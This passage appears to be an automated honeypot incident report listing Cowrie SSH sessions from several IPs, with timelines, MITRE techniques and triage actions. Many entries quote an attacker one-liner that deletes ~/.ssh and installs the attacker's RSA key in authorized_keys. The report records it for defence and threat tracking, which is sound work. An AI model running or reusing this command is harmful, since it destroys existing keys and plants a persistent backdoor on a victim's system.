| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 17:41:33` | `cowrie.session.connect` |
| `2026-04-14 17:41:33` | `cowrie.client.version` |
| `2026-04-14 17:41:33` | `cowrie.client.kex` |
| `2026-04-14 17:41:34` | `cowrie.login.success` |
| `2026-04-14 17:41:35` | `cowrie.session.params` |
| `2026-04-14 17:41:35` | `cowrie.command.input` |
| `2026-04-14 17:41:35` | `cowrie.command.failed` |
| `2026-04-14 17:41:35` | `cowrie.log.closed` |
| `2026-04-14 17:41:36` | `cowrie.session.params` |
| `2026-04-14 17:41:36` | `cowrie.command.input` |
| `2026-04-14 17:41:36` | `cowrie.session.file_download` |
| `2026-04-14 17:41:36` | `cowrie.log.closed` |
| `2026-04-14 17:41:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.23.198[.]86` to AbuseIPDB if not already reported
- [ ] Block `103.23.198[.]86` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6b5f2d7dae82

| Field | Detail |
|---|---|
| **Source IP** | `103.23.198[.]86` |
| **First Seen** | 2026-04-14 17:41 |
| **Last Seen** | 2026-04-14 17:41 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 17:41:39` | `cowrie.session.connect` |
| `2026-04-14 17:41:39` | `cowrie.client.version` |
| `2026-04-14 17:41:39` | `cowrie.client.kex` |
| `2026-04-14 17:41:40` | `cowrie.login.success` |
| `2026-04-14 17:41:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.23.198[.]86` to AbuseIPDB if not already reported
- [ ] Block `103.23.198[.]86` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4d4f83e9b4d0

| Field | Detail |
|---|---|
| **Source IP** | `38.19.156[.]18` |
| **First Seen** | 2026-04-14 17:42 |
| **Last Seen** | 2026-04-14 17:42 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 17:42:21` | `cowrie.session.connect` |
| `2026-04-14 17:42:21` | `cowrie.client.version` |
| `2026-04-14 17:42:22` | `cowrie.client.kex` |
| `2026-04-14 17:42:23` | `cowrie.login.success` |
| `2026-04-14 17:42:24` | `cowrie.session.params` |
| `2026-04-14 17:42:24` | `cowrie.command.input` |
| `2026-04-14 17:42:24` | `cowrie.command.failed` |
| `2026-04-14 17:42:24` | `cowrie.log.closed` |
| `2026-04-14 17:42:25` | `cowrie.session.params` |
| `2026-04-14 17:42:25` | `cowrie.command.input` |
| `2026-04-14 17:42:25` | `cowrie.session.file_download` |
| `2026-04-14 17:42:25` | `cowrie.log.closed` |
| `2026-04-14 17:42:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `38.19.156[.]18` to AbuseIPDB if not already reported
- [ ] Block `38.19.156[.]18` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3e7bda37e0af

| Field | Detail |
|---|---|
| **Source IP** | `38.19.156[.]18` |
| **First Seen** | 2026-04-14 17:42 |
| **Last Seen** | 2026-04-14 17:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 17:42:29` | `cowrie.session.connect` |
| `2026-04-14 17:42:29` | `cowrie.client.version` |
| `2026-04-14 17:42:29` | `cowrie.client.kex` |
| `2026-04-14 17:42:30` | `cowrie.login.success` |
| `2026-04-14 17:42:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `38.19.156[.]18` to AbuseIPDB if not already reported
- [ ] Block `38.19.156[.]18` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2f4534ca7c3d

| Field | Detail |
|---|---|
| **Source IP** | `103.146.159[.]14` |
| **First Seen** | 2026-04-14 17:42 |
| **Last Seen** | 2026-04-14 17:43 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 17:42:59` | `cowrie.session.connect` |
| `2026-04-14 17:42:59` | `cowrie.client.version` |
| `2026-04-14 17:42:59` | `cowrie.client.kex` |
| `2026-04-14 17:42:59` | `cowrie.login.success` |
| `2026-04-14 17:42:59` | `cowrie.session.params` |
| `2026-04-14 17:42:59` | `cowrie.command.input` |
| `2026-04-14 17:42:59` | `cowrie.command.failed` |
| `2026-04-14 17:43:00` | `cowrie.log.closed` |
| `2026-04-14 17:43:00` | `cowrie.session.params` |
| `2026-04-14 17:43:00` | `cowrie.command.input` |
| `2026-04-14 17:43:00` | `cowrie.session.file_download` |
| `2026-04-14 17:43:00` | `cowrie.log.closed` |
| `2026-04-14 17:43:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.146.159[.]14` to AbuseIPDB if not already reported
- [ ] Block `103.146.159[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dd3873fe3fc9

| Field | Detail |
|---|---|
| **Source IP** | `103.146.159[.]14` |
| **First Seen** | 2026-04-14 17:43 |
| **Last Seen** | 2026-04-14 17:43 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 17:43:02` | `cowrie.session.connect` |
| `2026-04-14 17:43:02` | `cowrie.client.version` |
| `2026-04-14 17:43:02` | `cowrie.client.kex` |
| `2026-04-14 17:43:02` | `cowrie.login.success` |
| `2026-04-14 17:43:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.146.159[.]14` to AbuseIPDB if not already reported
- [ ] Block `103.146.159[.]14` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3631a0bdb5dc

| Field | Detail |
|---|---|
| **Source IP** | `103.23.198[.]86` |
| **First Seen** | 2026-04-14 17:43 |
| **Last Seen** | 2026-04-14 17:44 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 17:43:59` | `cowrie.session.connect` |
| `2026-04-14 17:43:59` | `cowrie.client.version` |
| `2026-04-14 17:44:00` | `cowrie.client.kex` |
| `2026-04-14 17:44:01` | `cowrie.login.success` |
| `2026-04-14 17:44:01` | `cowrie.session.params` |
| `2026-04-14 17:44:01` | `cowrie.command.input` |
| `2026-04-14 17:44:01` | `cowrie.command.failed` |
| `2026-04-14 17:44:01` | `cowrie.log.closed` |
| `2026-04-14 17:44:02` | `cowrie.session.params` |
| `2026-04-14 17:44:02` | `cowrie.command.input` |
| `2026-04-14 17:44:02` | `cowrie.session.file_download` |
| `2026-04-14 17:44:02` | `cowrie.log.closed` |
| `2026-04-14 17:44:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.23.198[.]86` to AbuseIPDB if not already reported
- [ ] Block `103.23.198[.]86` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-54176f978e50

| Field | Detail |
|---|---|
| **Source IP** | `38.19.156[.]18` |
| **First Seen** | 2026-04-14 17:44 |
| **Last Seen** | 2026-04-14 17:44 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 17:44:01` | `cowrie.session.connect` |
| `2026-04-14 17:44:01` | `cowrie.client.version` |
| `2026-04-14 17:44:01` | `cowrie.client.kex` |
| `2026-04-14 17:44:03` | `cowrie.login.success` |
| `2026-04-14 17:44:03` | `cowrie.session.params` |
| `2026-04-14 17:44:03` | `cowrie.command.input` |
| `2026-04-14 17:44:03` | `cowrie.command.failed` |
| `2026-04-14 17:44:04` | `cowrie.log.closed` |
| `2026-04-14 17:44:04` | `cowrie.session.params` |
| `2026-04-14 17:44:04` | `cowrie.command.input` |
| `2026-04-14 17:44:05` | `cowrie.session.file_download` |
| `2026-04-14 17:44:05` | `cowrie.log.closed` |
| `2026-04-14 17:44:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `38.19.156[.]18` to AbuseIPDB if not already reported
- [ ] Block `38.19.156[.]18` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-299a25a246b7

| Field | Detail |
|---|---|
| **Source IP** | `103.23.198[.]86` |
| **First Seen** | 2026-04-14 17:44 |
| **Last Seen** | 2026-04-14 17:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 17:44:05` | `cowrie.session.connect` |
| `2026-04-14 17:44:05` | `cowrie.client.version` |
| `2026-04-14 17:44:05` | `cowrie.client.kex` |
| `2026-04-14 17:44:06` | `cowrie.login.success` |
| `2026-04-14 17:44:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.23.198[.]86` to AbuseIPDB if not already reported
- [ ] Block `103.23.198[.]86` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aa001dfeb0f4

| Field | Detail |
|---|---|
| **Source IP** | `38.19.156[.]18` |
| **First Seen** | 2026-04-14 17:44 |
| **Last Seen** | 2026-04-14 17:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 17:44:08` | `cowrie.session.connect` |
| `2026-04-14 17:44:08` | `cowrie.client.version` |
| `2026-04-14 17:44:09` | `cowrie.client.kex` |
| `2026-04-14 17:44:10` | `cowrie.login.success` |
| `2026-04-14 17:44:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `38.19.156[.]18` to AbuseIPDB if not already reported
- [ ] Block `38.19.156[.]18` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d1ddfb61937d

| Field | Detail |
|---|---|
| **Source IP** | `103.146.159[.]14` |
| **First Seen** | 2026-04-14 17:44 |
| **Last Seen** | 2026-04-14 17:44 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 17:44:34` | `cowrie.session.connect` |
| `2026-04-14 17:44:34` | `cowrie.client.version` |
| `2026-04-14 17:44:34` | `cowrie.client.kex` |
| `2026-04-14 17:44:34` | `cowrie.login.success` |
| `2026-04-14 17:44:34` | `cowrie.session.params` |
| `2026-04-14 17:44:34` | `cowrie.command.input` |
| `2026-04-14 17:44:34` | `cowrie.command.failed` |
| `2026-04-14 17:44:35` | `cowrie.log.closed` |
| `2026-04-14 17:44:35` | `cowrie.session.params` |
| `2026-04-14 17:44:35` | `cowrie.command.input` |
| `2026-04-14 17:44:35` | `cowrie.session.file_download` |
| `2026-04-14 17:44:35` | `cowrie.log.closed` |
| `2026-04-14 17:44:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.146.159[.]14` to AbuseIPDB if not already reported
- [ ] Block `103.146.159[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-41a5f1a22df7

| Field | Detail |
|---|---|
| **Source IP** | `103.146.159[.]14` |
| **First Seen** | 2026-04-14 17:44 |
| **Last Seen** | 2026-04-14 17:44 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 17:44:37` | `cowrie.session.connect` |
| `2026-04-14 17:44:37` | `cowrie.client.version` |
| `2026-04-14 17:44:37` | `cowrie.client.kex` |
| `2026-04-14 17:44:37` | `cowrie.login.success` |
| `2026-04-14 17:44:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.146.159[.]14` to AbuseIPDB if not already reported
- [ ] Block `103.146.159[.]14` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-023050544aaa

| Field | Detail |
|---|---|
| **Source IP** | `43.163.127[.]183` |
| **First Seen** | 2026-04-14 17:44 |
| **Last Seen** | 2026-04-14 17:45 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 17:44:57` | `cowrie.session.connect` |
| `2026-04-14 17:44:57` | `cowrie.client.version` |
| `2026-04-14 17:44:57` | `cowrie.client.kex` |
| `2026-04-14 17:44:58` | `cowrie.login.success` |
| `2026-04-14 17:44:58` | `cowrie.session.params` |
| `2026-04-14 17:44:58` | `cowrie.command.input` |
| `2026-04-14 17:44:58` | `cowrie.command.failed` |
| `2026-04-14 17:44:58` | `cowrie.log.closed` |
| `2026-04-14 17:44:58` | `cowrie.session.params` |
| `2026-04-14 17:44:58` | `cowrie.command.input` |
| `2026-04-14 17:44:58` | `cowrie.session.file_download` |
| `2026-04-14 17:44:58` | `cowrie.log.closed` |
| `2026-04-14 17:45:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.163.127[.]183` to AbuseIPDB if not already reported
- [ ] Block `43.163.127[.]183` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cb710147a4af

| Field | Detail |
|---|---|
| **Source IP** | `43.163.127[.]183` |
| **First Seen** | 2026-04-14 17:45 |
| **Last Seen** | 2026-04-14 17:45 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 17:45:00` | `cowrie.session.connect` |
| `2026-04-14 17:45:00` | `cowrie.client.version` |
| `2026-04-14 17:45:00` | `cowrie.client.kex` |
| `2026-04-14 17:45:00` | `cowrie.login.success` |
| `2026-04-14 17:45:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.163.127[.]183` to AbuseIPDB if not already reported
- [ ] Block `43.163.127[.]183` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d214ca71d0ed

| Field | Detail |
|---|---|
| **Source IP** | `38.19.156[.]18` |
| **First Seen** | 2026-04-14 17:45 |
| **Last Seen** | 2026-04-14 17:45 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 17:45:44` | `cowrie.session.connect` |
| `2026-04-14 17:45:44` | `cowrie.client.version` |
| `2026-04-14 17:45:44` | `cowrie.client.kex` |
| `2026-04-14 17:45:46` | `cowrie.login.success` |
| `2026-04-14 17:45:46` | `cowrie.session.params` |
| `2026-04-14 17:45:46` | `cowrie.command.input` |
| `2026-04-14 17:45:46` | `cowrie.command.failed` |
| `2026-04-14 17:45:47` | `cowrie.log.closed` |
| `2026-04-14 17:45:47` | `cowrie.session.params` |
| `2026-04-14 17:45:47` | `cowrie.command.input` |
| `2026-04-14 17:45:48` | `cowrie.session.file_download` |
| `2026-04-14 17:45:48` | `cowrie.log.closed` |
| `2026-04-14 17:45:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `38.19.156[.]18` to AbuseIPDB if not already reported
- [ ] Block `38.19.156[.]18` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-809984b02b22

| Field | Detail |
|---|---|
| **Source IP** | `38.19.156[.]18` |
| **First Seen** | 2026-04-14 17:45 |
| **Last Seen** | 2026-04-14 17:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 17:45:51` | `cowrie.session.connect` |
| `2026-04-14 17:45:51` | `cowrie.client.version` |
| `2026-04-14 17:45:51` | `cowrie.client.kex` |
| `2026-04-14 17:45:53` | `cowrie.login.success` |
| `2026-04-14 17:45:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `38.19.156[.]18` to AbuseIPDB if not already reported
- [ ] Block `38.19.156[.]18` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8dfe19fb87ac

| Field | Detail |
|---|---|
| **Source IP** | `103.146.159[.]14` |
| **First Seen** | 2026-04-14 17:46 |
| **Last Seen** | 2026-04-14 17:46 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 17:46:14` | `cowrie.session.connect` |
| `2026-04-14 17:46:14` | `cowrie.client.version` |
| `2026-04-14 17:46:14` | `cowrie.client.kex` |
| `2026-04-14 17:46:14` | `cowrie.login.success` |
| `2026-04-14 17:46:15` | `cowrie.session.params` |
| `2026-04-14 17:46:15` | `cowrie.command.input` |
